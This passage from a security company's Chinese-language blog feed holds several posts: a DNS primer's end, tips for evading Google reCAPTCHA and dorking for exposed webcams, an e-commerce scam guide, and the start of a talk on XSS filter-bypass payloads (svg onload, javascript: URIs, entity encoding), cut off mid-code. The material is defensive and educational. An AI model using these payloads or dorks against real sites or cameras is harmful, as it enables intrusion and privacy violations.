反轉，然後後綴加上 <code>&quot;.in-addr.arpa&quot;</code> 來構成網域，例如 <code>14.13.12.11</code> 就會被放在 <code>&quot;11.12.13.14.in-addr.arpa&quot;</code> 的網域下。如果是 IPv6，反轉後會被轉換成 4-bit 區段，並加上 <code>&quot;.ip6.arpa&quot;</code>，如 <code>2001:db8::567:89ab</code> 會變成 <code>b.a.9.8.7.6.5.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.8.b.d.0.1.0.0.2.ip6.arpa</code>。</p>\n<p><code>.arpa</code> 是最早創立的一個 TLD，源於網路世界草創期的先驅 Advanced Research Projects Agency (ARPA) 的縮寫，不過目前被重新定義為 Address and Routing Parameter Area (ARPA)。<code>.arpa</code> 由 IETF 用於管理網路架構，不提供網域註冊也鮮少新增子網域。</p>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>DNS 是網路世界的電話簿，負擔起全世界的網路流量跟導航，是每個人生活中不可或缺的一環。從 1980 年代到現在，DNS 已經有十分悠久的歷史，也經歷了多次修改與強化，然而如同多數古老的協議，最初的設計其實並沒有考量到太多資安層面，導致隨著應用範圍越來越廣、各種技術越來越進步，層出不窮的攻擊手法才使得許多潛在的資安議題浮出檯面，各種防禦也因應而生。</p>\n<p>為了後續能介紹一些 DNS 相關的攻擊，開頭還是要先科普一下確定大家都具備基礎知識。下一篇我們會聊聊 DNS 常見的攻擊手法與相應的防禦，探討這場攻防戰的演進史。</p>\n<p>這篇中的資訊多取自維基百科與 <a href=\"https://www.cloudflare.com/learning/dns\">Cloudfare DNS Learning</a> 的介紹，Cloudfare 提供相當完整且深入的資訊，推薦給大家～</p>\n",
      "date_published": "2021-11-25T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/google-recaptcha/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/google-recaptcha/",
      "title": "當 Google Hacking 遇到 reCAPTCHA",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<p>Google 的搜索引擎本身就是世界最大的網路爬蟲之一，無時無刻都在收集資料，但卻不喜歡別人爬走它的資料，用了自家開發的 reCAPTCHA 來保護自己。</p>\n<!-- summary -->\n<p>提升自動化程度可以說是多數軟體工程師的目標，大家都想躺著賺錢，資安工程師也不例外，而 reCAPTCHA 可以說是 Google Hacking 自動化時會遇到的最大障礙，在嘗試了多種方法後決定寫篇文章記錄一下最後成功的方法，分享下各自的優缺點後加上主觀評分。</p>\n<!-- summary -->\n<hr>\n<h2 id=\"google-hacking-%E7%B0%A1%E4%BB%8B\"><a class=\"direct-link\" href=\"#google-hacking-%E7%B0%A1%E4%BB%8B\">#</a> Google Hacking 簡介</h2>\n<p>Google Hacking 簡單來說就是駭客利用 Google Search 來收集攻擊所需要的資料，最常見的就是利用進階搜索語法來找出敏感或非公開資訊，細講的話可以寫一整篇文章，下面提供一個簡單的 Google Hacking 範例，此範例能快速找出不設防的網路錄影機，找到後人人都可以駭進去。</p>\n<p>範例 : <code>intext:&quot;powered by webcamXP 5&quot;</code></p>\n<p><img src=\"/img/posts/nick/google-recaptcha/re_2.jpg\" alt=\"\"></p>\n<h2 id=\"recaptcha-%E7%B0%A1%E4%BB%8B\"><a class=\"direct-link\" href=\"#recaptcha-%E7%B0%A1%E4%BB%8B\">#</a> reCAPTCHA 簡介</h2>\n<p>Google 會記錄使用者搜索的內容與瀏覽器上的資訊，當背後的 AI 藉由這些紀錄判斷當前使用者可能是自動化程式時，就會啟動 reCAPTCHA 驗證機制，跳出如下圖的視窗，需要通過測試 Google 才會進行這次搜索。</p>\n<p><img src=\"/img/posts/nick/google-recaptcha/re_3.jpg\" alt=\"\"></p>\n<p>reCAPTCHA 最早會出對人簡單但對機器來說困難的問題，並藉回答的結果來分辨使用者是人還機器，後來隨著 Google AI 越來越強大，大多數狀況下已經可以只用瀏覽器上的資訊判斷是否為真人，所以後期的版本只要打個勾就可以放行，高度懷疑不是真人時才會請你做題目，很多網站上都可以看到下圖。</p>\n<p><img src=\"/img/posts/nick/google-recaptcha/re_4.jpg\" alt=\"\"></p>\n<hr>\n<h2 id=\"%E8%A2%AB-recaptcha-%E6%93%8B%E4%BA%86%E6%80%8E%E9%BA%BC%E8%BE%A6-%3F\"><a class=\"direct-link\" href=\"#%E8%A2%AB-recaptcha-%E6%93%8B%E4%BA%86%E6%80%8E%E9%BA%BC%E8%BE%A6-%3F\">#</a> 被 reCAPTCHA 擋了怎麼辦 ?</h2>\n<p>如果不想被 Google 的 reCAPTCHA 檔住，最簡單而且最穩妥方法是透過 Google 提供的 API 來進行搜索，但是每天只有 100 次的免費查詢額度，之後每 1000 次查詢要付 5 美元。如果跟我一樣不打算在測試階段就噴錢，或是預算不充足的話就需要多了解一下後面要介紹的解決方案。</p>\n<p>爬站時不管是資安人員還是駭客都想繞過 reCAPTCHA，但背後有機器學習導致規則不斷變化，在加上本身不斷改版，所以不少網住文章上的繞過方法都已經失效，這邊分享 3 個經過驗證，至少在當前版本可行的繞過方法。</p>\n<p><img src=\"/img/posts/nick/google-recaptcha/re_5.jpg\" alt=\"\"></p>\n<h3 id=\"%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-1-%3A-%E5%81%BD%E8%A3%9D\"><a class=\"direct-link\" href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-1-%3A-%E5%81%BD%E8%A3%9D\">#</a> 解決方案 1 : 偽裝</h3>\n<p>偽裝成一般人使用搜索功能，避免出現 reCAPTCHA，偽裝的話有很多細節，但最直接影響 reCAPTCHA 出現的有 2 點。</p>\n<ol>\n<li>\n<p><strong>設定 User-Agent 偽裝成常見的設備:</strong><br>\n只要將 User-Agent 的值改的跟下方範例一樣，網站會認為連進來的人用的是 Mac OS，如果從來源不明的裝置送請求跳出 reCAPTCHA 的機會將大幅提升，很明顯 Google 對從 Mac 或 Windows 等常見設備的請求檢查較寬鬆。</p>\n<p><code>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9</code></p>\n<p>設定好 User-Agent 後可以到 <a href=\"https://userstack.com/\">userstack.com</a> 這個網站來檢查偽冒有沒有成功，成功會如下圖。</p>\n<p><img src=\"/img/posts/nick/google-recaptcha/re_6.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>避免短時間內發送大量或重複的請求:</strong><br>\n即使裝的在像一般人發的請求，短時間內發太多次的話還是會被發現，重複太多次也一樣，Google 可以很容易從這些資訊猜出送請求的是自動化程式。</p>\n</li>\n</ol>\n<h3 id=\"%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-2-%3A-%E6%AD%A3%E9%9D%A2%E5%B0%8D%E6%B1%BA\"><a class=\"direct-link\" href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-2-%3A-%E6%AD%A3%E9%9D%A2%E5%B0%8D%E6%B1%BA\">#</a> 解決方案 2 : 正面對決</h3>\n<p>模仿一般人去回答 reCAPTCHA 的問題，但針對 reCAPTCHA 做出一套影像辨識系統非常麻煩，有一個取巧的方法是利用盲人輔助功能，讓回答難度從影像辨識降低到語音辨識，降到語音辨識後甚至可以讓 Google Speech 來對付 Google reCAPTCHA。</p>\n<p><img src=\"/img/posts/nick/google-recaptcha/re_7.jpg\" alt=\"\"></p>\n<p>自動化測試時用的是 Python 的 SpeechRecognition 模組，利用模組中的 recognixe_google() 去呼叫 Google 語音辨識 API，讓 Google 語音辨識解決 Google reCAPTCHA 出的題目。</p>\n<h3 id=\"%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-3-%3A-%E6%8F%9B%E5%BC%95%E6%93%8E\"><a class=\"direct-link\" href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88-3-%3A-%E6%8F%9B%E5%BC%95%E6%93%8E\">#</a> 解決方案 3 : 換引擎</h3>\n<p>找其他沒有 reCAPTCHA 的搜索引擎來用，這邊實測微軟的旗下的 Bing 沒有任何搜索限制 ~</p>\n<p><img src=\"/img/posts/nick/google-recaptcha/re_8.jpg\" alt=\"\"></p>\n<p>Bing 的搜索規則跟 Google 大同小異，這邊列一些覺得比較實用的規則給大家參考，紅字的是 Bing 才有 Google 沒有的規則，詳細規則可點連結看官方文件，這邊就不逐一介紹。</p>\n<p><a href=\"https://help.bing.microsoft.com/#apex/bing/en-US/10001/-1\">https://help.bing.microsoft.com/#apex/bing/en-US/10001/-1</a></p>\n<table>\n<thead>\n<tr>\n<th>規則</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>contains</td>\n<td>只搜索包含指定文件類型的鏈接的網站</td>\n</tr>\n<tr>\n<td>filetype</td>\n<td>僅返回以指定文件類型創建的網頁</td>\n</tr>\n<tr>\n<td><font color=#FF0000>ip</font></td>\n<td><font color=#FF0000>查找託管在特定 IP 地址的網站</font></td>\n</tr>\n<tr>\n<td><font color=#FF0000>language</font></td>\n<td><font color=#FF0000>返回指定語言的網頁</font></td>\n</tr>\n<tr>\n<td><font color=#FF0000>location</font></td>\n<td><font color=#FF0000>返回特定國家或地區的網頁</font></td>\n</tr>\n<tr>\n<td>url</td>\n<td>檢查列出的域或網址是否位於 Bing 索引中</td>\n</tr>\n<tr>\n<td>inanchor</td>\n<td>網頁元素查詢，含特定定位標記的網頁</td>\n</tr>\n<tr>\n<td>inbody</td>\n<td>網頁元素查詢，含特定正文的網頁</td>\n</tr>\n<tr>\n<td>intitle</td>\n<td>只搜索包含指定文件類型的鏈接的網站</td>\n</tr>\n</tbody>\n</table>\n<p>與前面一樣舉個找網路攝影機的範例，再加上地區限制為台灣，第一筆搜索結果就是台北碧潭的監視器<br>\n範例: <code>inbody:&quot;powered by webcamXP 5&quot; location:TW</code></p>\n<p><img src=\"/img/posts/nick/google-recaptcha/re_9.jpg\" alt=\"\"></p>\n<hr>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>最後討論一下各方法的優缺點，用適不適合自動化的角度來打分數，如果其他用途，可以看一下各方法的優缺點來決定，適合才是最重要的。</p>\n<h3 id=\"%E5%81%BD%E8%A3%9D-%3A-%E2%98%85%E2%98%85%E2%98%85%E2%98%86%E2%98%86\"><a class=\"direct-link\" href=\"#%E5%81%BD%E8%A3%9D-%3A-%E2%98%85%E2%98%85%E2%98%85%E2%98%86%E2%98%86\">#</a> 偽裝 : ★★★☆☆</h3>\n<ul>\n<li>優點: 設定簡單、可跳過驗證</li>\n<li>缺點: 效率差、有機會被鎖</li>\n<li>使用心得:<br>\n雖然只要靠設定就可以繞過驗證，但這方法最大的問題兩次搜索之間必須設定較長的等待時間來模仿一般人在使用搜索功能，這會導致自動化的效率有限，更換 IP 或者其他設定能降低被發現的機會，但搜索頻率高到一定程度還是會被抓到，而一但被判斷是自動化程式接下來一天都會跳出跳出 reCAPTCHA 驗證頁面。</li>\n</ul>\n<h3 id=\"%E6%AD%A3%E9%9D%A2%E5%B0%8D%E6%B1%BA-%3A-%E2%98%85%E2%98%85%E2%98%86%E2%98%86%E2%98%86\"><a class=\"direct-link\" href=\"#%E6%AD%A3%E9%9D%A2%E5%B0%8D%E6%B1%BA-%3A-%E2%98%85%E2%98%85%E2%98%86%E2%98%86%E2%98%86\">#</a> 正面對決 : ★★☆☆☆</h3>\n<ul>\n<li>優點: 穩定</li>\n<li>缺點: 有次數上限、驗證複雜</li>\n<li>使用心得:<br>\n因為不用擔心像前一個方法跳出驗證就導致服務中斷，比起來穩定的多，可惜的是語音辨識多使用幾次後 Google 背後的 AI 會開始懷疑來源是自動化程式，一旦懷疑就會禁用語音驗證的功能，這時候就不能再用 Google Speech 來對付 reCAPTCHA 了。</li>\n</ul>\n<h3 id=\"%E6%8F%9B%E5%BC%95%E6%93%8E-%3A-%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%86\"><a class=\"direct-link\" href=\"#%E6%8F%9B%E5%BC%95%E6%93%8E-%3A-%E2%98%85%E2%98%85%E2%98%85%E2%98%85%E2%98%86\">#</a> 換引擎 : ★★★★☆</h3>\n<ul>\n<li>優點: 沒有 reCAPTCHA 限制</li>\n<li>缺點: 部分結果被過濾</li>\n<li>使用心得:<br>\n沒有限制後要自動化容易多了，不會綁手綁腳，唯一可惜的地方是 Bing 會過濾掉一些 Microsoft 認為重複或不重要的結果，Google 雖然預設也會過濾但可選擇顯示所有結果，很可惜 Bing 沒有提供這個選項，導致有機會漏掉一些資料，如果可以看到所有資料肯定給 5 顆星。</li>\n</ul>\n<p>前面為快速說明原理挑了一些簡單易懂的攻擊來示範，實際上還有更多更進階的用法，如果閱覽數量夠多，之後會再加開一篇分享一些更進階的用法與經典案例，有任何資安方面相關的問題都歡迎留言討論，或者直接到 Cymetrics 尋求協助。</p>\n",
      "date_published": "2021-11-10T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/cymetrics/ecommerce-scam/",
      "url": "https://tech-blog.cymetrics.io/posts/cymetrics/ecommerce-scam/",
      "title": "簡單三招學會辨識電商詐騙，讓你在雙11安心購物",
      "content_html": "<p>現在有越來越多人習慣在網路上購物，在臉書上也可以看見許多購物網站的廣告，文案寫得極其吸引人，價格又便宜，引起了許多人的興趣，紛紛在上面下單。</p>\n<!-- summary -->\n<p>但另一方面，電視台每天都在播報關於網路詐騙的新聞，而且手法層出不窮，在這個電商詐騙猖狂的狀況之下，只要多注意一些地方，就能夠降低受騙的機率。</p>\n<!-- summary -->\n<p>我們可以把電商詐騙分成兩種類型，分別是：</p>\n<ol>\n<li>利用你去電商網站購物的資訊進行詐騙</li>\n<li>電商網站本身就是個詐騙</li>\n</ol>\n<p>舉個例子，前者像是去某個線上書店買書，網站本身沒有問題，是合法的公司經營的，但是詐騙集團卻透過這個網站（可能是資料外洩或是駭客入侵）得知了我的資訊，因此打電話來跟我說要設定分期付款等等，讓我去 ATM 操作。像是這種就是典型的電商詐騙，也是我們常常在新聞上所看到的，購買產品本身沒有問題，但是資訊被洩漏出去。</p>\n<p>這類型的詐騙政府有不斷宣導，去便利商店或是 ATM 操作時也可能被店員提醒，但除了這種以外，還有另外一種類型。</p>\n<p>另一種類型的購物網站本身就是個詐騙，例如說你在網站上買了「日本進口 A5 和牛」，實際上也確實收到貨，但卻發現貨品根本不是日本進口的和牛，只是一般的牛肉而已。這類型的詐騙比較新穎，而且比較能使人放鬆戒心，是近期詐騙案例數量不斷上升的類別。</p>\n<p>底下幾個小技巧，能幫助你儘早識破這些詐騙的手段，保障自己的安全。</p>\n<h2 id=\"%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E6%85%8E%E9%81%B8%E9%9B%BB%E5%95%86%E5%B9%B3%E5%8F%B0\"><a class=\"direct-link\" href=\"#%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%9A%E6%85%8E%E9%81%B8%E9%9B%BB%E5%95%86%E5%B9%B3%E5%8F%B0\">#</a> 技巧一：慎選電商平台</h2>\n<p>來路不明的電商網站，有問題的機率比較高，這類型的網站常以 Facebook 的廣告形式出現，許多都是一頁式的購物網站，文案寫得浮誇，還有一堆人背書。</p>\n<p><img src=\"/img/posts/cymetrics/ecommerce-scam/facebook.jpg\" alt=\"\"><br>\n（圖片來自政府宣導網站）</p>\n<p>在挑選購物平台時，盡可能選擇比較有保障的大型電商，通常會比這些小網站來得安全。或至少在消費前先去搜尋一下這個平台的資料，盡可能多了解這個平台。除此之外，也可以利用一些<a href=\"https://safebuy.tw/\">現成的服務</a>做檢查。</p>\n<p>更多資訊可以參考：</p>\n<ol>\n<li><a href=\"https://www.pthg.gov.tw/News_Content.aspx?n=389C74C7BFF8870A&amp;sms=8B92ABA7B0E7A88F&amp;s=5DC2EFD57845DF5C\">越來越像真的電商平臺！1頁式詐騙網站再進化</a></li>\n<li><a href=\"https://www.cw.com.tw/article/5118036\">疫情賣血氧機、奧運賣球鞋　一頁式廣告詐騙猖獗，到底多難抓？</a></li>\n<li><a href=\"https://cpc.ey.gov.tw/Page/6C059838CA9744A8/01b4ba0f-df24-4321-9580-4522a6b293bc\">一頁式廣告詐騙多 小心查證保障多</a></li>\n</ol>\n<h2 id=\"%E6%8A%80%E5%B7%A7%E4%BA%8C%EF%BC%9A%E6%B3%A8%E6%84%8F%E9%87%A3%E9%AD%9A%E5%BB%A3%E5%91%8A\"><a class=\"direct-link\" href=\"#%E6%8A%80%E5%B7%A7%E4%BA%8C%EF%BC%9A%E6%B3%A8%E6%84%8F%E9%87%A3%E9%AD%9A%E5%BB%A3%E5%91%8A\">#</a> 技巧二：注意釣魚廣告</h2>\n<p>當你在 Google 上面搜尋關鍵字時，最前面通常會出現一些廣告，這些搜尋結果會在側邊欄特別顯示「廣告」兩個字，讓消費者知道這是廣告。</p>\n<p><img src=\"/img/posts/cymetrics/ecommerce-scam/search.png\" alt=\"\"></p>\n<p>但現在有些釣魚網站會利用 Google 廣告，直接購買原版的關鍵字。例如說做一個盜版的「ABC 購物網站」，並且針對這個關鍵字下廣告，那有些使用者搜尋「ABC 購物網站」的時候，搜尋結果就會出現這個假的網站，點進去以後通常會要你登入或是結帳時輸入信用卡號，一旦輸入了，資料就會被盜走。</p>\n<p>因此，在點擊廣告時，記得留意一下網址，點進去以後也要觀察是否直接要你登入或是輸入資訊。</p>\n<p>實際案例：<a href=\"https://www.mygopen.com/2021/09/fake-costco.html\">【詐騙】假的Costco好市多線上購物網站還下Google廣告！騙信用卡、別輸入帳號密碼！</a></p>\n<h2 id=\"%E6%8A%80%E5%B7%A7%E4%B8%89%EF%BC%9A%E5%B0%8F%E5%BF%83%E9%87%A3%E9%AD%9A%E4%BF%A1%E4%BB%B6\"><a class=\"direct-link\" href=\"#%E6%8A%80%E5%B7%A7%E4%B8%89%EF%BC%9A%E5%B0%8F%E5%BF%83%E9%87%A3%E9%AD%9A%E4%BF%A1%E4%BB%B6\">#</a> 技巧三：小心釣魚信件</h2>\n<p>如果有些網站沒有把網域設定好，就會讓駭客有機會發送釣魚信件，舉例來說，我可以假冒別人的網域發送信件，如果收到信件的人沒有仔細注意，就會信以為真。</p>\n<p>通常這種釣魚信件裡面都會有一個連結，點進去以後會連到假的網站，接著要你輸入帳號密碼或是其他敏感資訊，藉此偷走你的資料。輸入完以後還會導回真的網站，在神不知鬼不覺的狀況下完成攻擊。</p>\n<p>我們之前也特別寫過一篇文章在談這件事情：<a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory/\">關於 email security 的大小事 — 原理篇</a></p>\n<p>在收到郵件時，記得檢查寄件人的地址跟內容，也要檢查信裡面的連結，看看是不是來自可疑的網域。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>雙 11 購物節即將來臨，緊接著的是雙 12 以及歲末的購物節慶。想要防止電商詐騙，就必須心懷謹慎，務必在點進去連結之前先檢查一下連過去的網址，在抵達網頁以後也要檢查網頁的內容是否可疑，如果發現有可疑之處，就立刻關閉網站，不要在上面消費。</p>\n<p>只要多花一點心力去注意一些細節，就能辨識出電商詐騙的網站，免於被偷取資料或是詐騙的風險，在雙 11 中以及各種購物節慶中安心購物！</p>\n",
      "date_published": "2021-11-08T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/learn-frontend-from-security-pov/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/learn-frontend-from-security-pov/",
      "title": "接觸資安才發現我不懂前端",
      "content_html": "<p>此文章是我在 Modern Web 2021 的分享：《接觸資安才發現前端的水真深》的文字版，當時的演講影片尚未釋出，想看簡報的話在這邊：<a href=\"https://speakerdeck.com/aszx87410/jie-chu-zi-an-cai-fa-xian-qian-duan-de-shui-zhen-shen-modern-web-2021\">slides</a></p>\n<p>我自己覺得影片加上簡報的效果應該會比文字好，但想說用文字留一份紀錄也不錯，因此還是寫了這篇文章，內容會有些許與影片不同，有點像是再重新寫了一遍。</p>\n<h2 id=\"%E5%8E%9F%E4%BE%86%E6%88%91%E4%B8%8D%E6%87%82%E5%89%8D%E7%AB%AF\"><a class=\"direct-link\" href=\"#%E5%8E%9F%E4%BE%86%E6%88%91%E4%B8%8D%E6%87%82%E5%89%8D%E7%AB%AF\">#</a> 原來我不懂前端</h2>\n<p>這個標題是我接觸到資安的世界以後，最真實的想法。</p>\n<p>身為一個前端工程師，自認為對前端頗為熟悉，無論是原生的 JavaScript 還是一些框架或函式庫，多少都用過或者聽過，連看到許多奇形怪狀的 JavaScript 題目也不會感到太過驚訝，覺得已經沒什麼能讓我「哇！」這樣的驚嘆。</p>\n<p>直到我接觸了資安相關的東西，才知道是我太天真。</p>\n<p><img src=\"/img/posts/huli/learn-frontend-from-security-pov/p1-ice.jpg\" alt=\"\"></p>\n<p>前端工程師所接觸的前端，跟資安工程師所看到的前端是兩個不同的面向。資安的重點在於各式各樣的攻擊手法，要想辦法繞過既有的限制，找到一條新的道路。但是前端工程師根本不需要知道那些東西，因為他是在沒有限制的狀況下來寫 code 的。</p>\n<!-- summary -->\n<p>這陣子有玩了一些 CTF，對於前端也從另一個角度看了一陣子，學到很多新的前端知識，換句話說，我在一個新的領域（資安）重新學習到了我原本熟悉的領域（前端）的知識，這種感覺十分特別，因此這篇文章想跟大家分享我學到的一些東西，希望能讓大家感受到我當初的驚訝。</p>\n<!-- summary -->\n<p>此文章分成三個主題：</p>\n<ol>\n<li>繞過各種限制</li>\n<li>XS leaks</li>\n<li>其他你可能不知道的功能</li>\n</ol>\n<h2 id=\"%E7%B9%9E%E9%81%8E%E5%90%84%E7%A8%AE%E9%99%90%E5%88%B6\"><a class=\"direct-link\" href=\"#%E7%B9%9E%E9%81%8E%E5%90%84%E7%A8%AE%E9%99%90%E5%88%B6\">#</a> 繞過各種限制</h2>\n<p>談到前端安全，第一個想到的想必是 XSS，有關 XSS 的文章跟介紹之前寫過不少了，有興趣的話可以參考：<a href=\"https://tech-blog.cymetrics.io/posts/huli/xss-history/\">XSS 從頭談起：歷史與由來</a>，這邊就不再贅述。</p>\n<p>一個最簡單直覺的 XSS payload 會長這樣：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>但這種形式的 XSS 不夠有趣，而且很容易被防禦住，所以我們先暫時不講這個，來看一些比較有趣的，例如說這個：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>non_exist</span> <span class=\"token special-attr\"><span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span></span></span><span class=\"token punctuation\">></span></span></code></pre>\n<p>這一段 HTML 利用 event handler 的方式去執行 JavaScript，我們載入一張不存在的圖片，就會觸發 onerror 事件，執行到裡面的程式碼。還有一點值得注意的是，其實屬性不需要加 <code>&quot;&quot;</code> 也可以。</p>\n<p>還可以再更進一步，變成這樣：</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>svg</span> <span class=\"token special-attr\"><span class=\"token attr-name\">onload</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span></span></span><span class=\"token punctuation\">></span></span></code></pre>\n<p>這次連 src 都不需要了，直接用 <code>&lt;svg&gt;</code> 搭配 <code>onload</code> 事件去執行程式碼。</p>\n<p>假設小明是一位後端工程師，責任是去過濾這些輸入的字串，讓它不要產生 XSS 漏洞，除了過濾 <code>&lt;script&gt;</code> 以外，小明也過濾了空格。理由很簡單，像是這種用屬性來執行的 XSS，屬性跟標籤之間一定要有空格對吧？那一旦把空格濾掉，不就沒辦法利用屬性來做 XSS 了嗎？</p>\n<p>天真的小明踢到了鐵板，因為其實可以這樣：</p>\n<pre class=\"language-html\"><code class=\"language-html\">&lt;svg/onload=alert(1)><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>svg</span>    <span class=\"token special-attr\"><span class=\"token attr-name\">onload</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span></span></span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>svg</span><br><span class=\"token special-attr\"><span class=\"token attr-name\">onload</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span></span></span><span class=\"token punctuation\">></span></span></code></pre>\n<p>除了空格以外，<code>/</code>、tab 還有換行都是合法的分隔符號，所以如果只取代空格的話是沒有用的。</p>\n<p>小明知道這個規則以後，察覺到根本問題其實不是空格，而是 <code>onxxx</code> 這種以 on 開頭的 event handler，於是他把 on 開頭的屬性全都過濾掉了，心想：「只要沒辦法用 event handler，就沒辦法 XSS 吧？」</p>\n<p>聽起來十分合理，但他不知道的是，就算沒有 event handler 也可以：</p>\n<pre class=\"language-html\"><code class=\"language-html\">&lt;iframe/src=\"javascript:alert(1)\"></code></pre>\n<p><code>javascript:</code> 開頭的字串稱為 JavaScript pseudo protocol，在一些地方可以用來執行程式碼，之前我們在<a href=\"https://tech-blog.cymetrics.io/posts/huli/open-redirect/\">《在做跳轉功能時應該注意的問題：Open Redirect》</a>中就有提過這個特性。</p>\n<p>小明的防禦再度破功，只好再次加強，把 <code>javascript</code> 這個看起來很危險的字串取代掉，這樣應該就沒事了吧？</p>\n<p>殊不知，原來在 <code>javascript</code> 這幾個字中間塞入 tab 以後，居然還是有效：</p>\n<pre class=\"language-html\"><code class=\"language-html\">&lt;iframe/src=\"javas    cript:alert(1)\"></code></pre>\n<p>小明修正了程式碼，把那些有的沒的像是空白、空行或是 tab 全都取代成空字串，然後再檢查一次有沒有 <code>javascript</code>，有的話就過濾掉，如此一來，上面的 payload 就無法運作了。</p>\n<p>但小明忘記網頁上的資訊是可以編碼的，例如說你想在畫面上呈現 <code>&lt;h1&gt;</code>，你要編碼成 <code>&amp;lt;h1&amp;gt;</code>，這樣畫面呈現的是你要的東西，而不是被當作 h1 標籤來解析。除了那些特殊符號，一般的文字也可以用 <code>&amp;#{ascii_code};</code> 來編碼，例如說 <code>j</code> 的 ascii code 是 106，就可以編碼成 <code>&amp;#106;</code>：</p>\n<pre class=\"language-html\"><code class=\"language-html\">&lt;iframe/src=\"<span class=\"token entity\" title=\"&#106;\">&amp;#106;</span>avascript:alert(1)\"></code></pre>\n<p>如果你想要的話，可以把整串字全部都編碼，就只會剩下一些符號跟數字而已。</p>\n<p>惱怒的小明這次不演了，直接禁用 <code>src</code> 屬性，想說「那我把 src 都禁用就沒事了吧？不要再來煩我了！」</p>\n<p>但他忘記的事情是，<code>&lt;a&gt;</code> 也可以用這個屬性：</p>\n<pre class=\"language-html\"><code class=\"language-html\">&lt;a/href=\"<span class=\"token entity\" title=\"&#106;\">&amp;#106;</span>avascript:alert(1)\">點我<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>只是這次就不會自動觸發了，需要使用者主動點擊才能觸發。</p>\n<p>最後小明真的受不了了，於是覆蓋了一張 <a href=\"https://github.com/cure53/DOMPurify\">DOMPurify</a>，結束這個回合。</p>\n<p>除了上面的這些標籤跟屬性的繞過以外，JavaScript 本身的繞過也滿好玩的，例如說：「有沒有辦法在不使用 <code>()</code> 的狀況下執行函式？」</p>\n<p>如果你有用過 React 的 styled-components 或類似的東西，應該寫過像這樣的程式碼：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> Box <span class=\"token operator\">=</span> styled<span class=\"token punctuation\">.</span>div<span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"><br>  background: red;<br></span><span class=\"token template-punctuation string\">`</span></span></code></pre>\n<p>為什麼這樣就可以產生出一個 component 呢？這是因為反引號除了可以用來當作 template string 以外，也可以拿來當作函式呼叫，這我在 <a href=\"https://blog.huli.tw/2021/06/07/xss-challenge-by-intigriti-writeup-may/\"> Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼</a>裡面有提到過。</p>\n<p>所以可以這樣寫：</p>\n<pre class=\"language-js\"><code class=\"language-js\">alert<span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">1</span><span class=\"token template-punctuation 